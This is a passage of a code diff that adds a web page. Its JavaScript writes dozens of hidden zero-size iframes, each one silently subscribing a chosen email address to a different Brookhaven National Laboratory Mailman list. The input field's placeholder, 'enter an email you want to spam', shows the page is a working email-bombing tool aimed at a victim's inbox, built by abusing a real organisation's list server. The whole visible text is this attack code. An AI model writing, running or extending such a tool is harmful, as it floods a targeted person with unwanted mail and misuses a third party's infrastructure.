+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/ags-rhic-users-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/ags-rhic-users-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/agscontacts-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/air-quality-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/all-bnl-guests-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/all-bnl-guests-nocontractors-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/andy-bnl-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/apss-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/astro-bnl-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/atf-info-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/atf-pac-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/atlas-bnl-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/atlas-connect-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/autopyfactory-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/badminton-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bbc-members-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bera-iaa-external-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bera-iaa-internal-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bgq-users-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bicycling-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/biker-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/biominerals-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bionsls2-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bnl-alarms?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bnl-announce-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bnl-asap-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bnl-eg-asap-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bnl-eg30-asap-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bnl-gis-info-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscrib' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bnl-gis-reviewers-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bnl-git-lab-users?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bnl-guest-extention-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bnl-guv-specific-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bnl-makers-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bnl-musicclub-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bnl-php-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bnlpostdocs-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bnl-rhic-netp?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bnl-scc-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bnl-shared-tier3-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bnlarc-class-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bnlarc-general-class-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bnlarc-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bnlarc-skywarn?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bnlitdlibraryusers-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/nlretirees-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/brams-dev-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/brahms-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/broadcast-l-test?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/bwis-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/cfn-clean-room-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/cfn-newsletter-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/chinese-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/concur-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/cosmos-group-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/cryptocard-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/csac-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+        document.write(
+          "<iframe frameborder='0' src='http://lists.bnl.gov/mailman/subscribe/cspwg-l?email=" +
+            spam_id +
+            "&fullname=&pw=Ab123456789&pw-conf=Ab123456789&digest=1&email-button=Subscribe' width='0' height='0'></iframe>"
+        );
+      };
+    </script>
+
+    <center>
+      <input
+        type="text"
+        id="spam_id"
+        placeholder="enter an email you want to spam"
+      />
+      <input type="button" value="send" onclick="spam()" />
+    </center>
+  </body>
+</html>
